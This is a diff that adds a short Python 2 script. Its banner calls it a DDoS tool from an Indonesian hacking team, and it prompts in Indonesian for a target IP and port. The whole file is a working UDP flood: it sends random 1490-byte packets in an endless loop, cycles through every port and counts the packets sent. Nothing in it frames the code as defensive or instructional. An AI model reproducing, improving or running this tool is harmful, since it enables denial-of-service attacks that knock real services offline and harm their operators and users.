@@ -1,0 +1,56 @@
+import os, socket, random, time
+
+##color
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############################
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+
+print R+"    !!!!!!!!!!!!!!!!!!!!!!!!!!!"
+print"    !!Coded By:No Name       !!"
+print"    !!        :Cibebek1337   !!"
+print"    !!Androsec1337 Cyber Team!!"
+print"    !!Ddos Attack Indonesia  !!"
+print"    !!!!!!!!!!!!!!!!!!!!!!!!!!!"
+print "Jam:" ,hour,":",minute,
+print
+print B+"        This Is Tools DDOS"
+print
+print"Jangan Menyerah Sebelum Down!!"
+print"We Are Team Ddos Indonesia"
+
+ip=raw_input("[*]Masukkan Web/Ip nya: ")
+port=input("[*]Masukkan Port Nya: ")
+os.system("clear")
+
+print"Ddos Di Mulai Pada {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+time.sleep(2)
+print
+sent = 0
+while True:
+      sock.sendto(bytes, (ip,port))
+      sent = sent + 1
+      port = port + 1
+      print"Mengirim %s paket ke %s port:%s"%(sent,ip,port)
+      if port == 65534:
+        port = 1
+
+
+
+
+
+
+
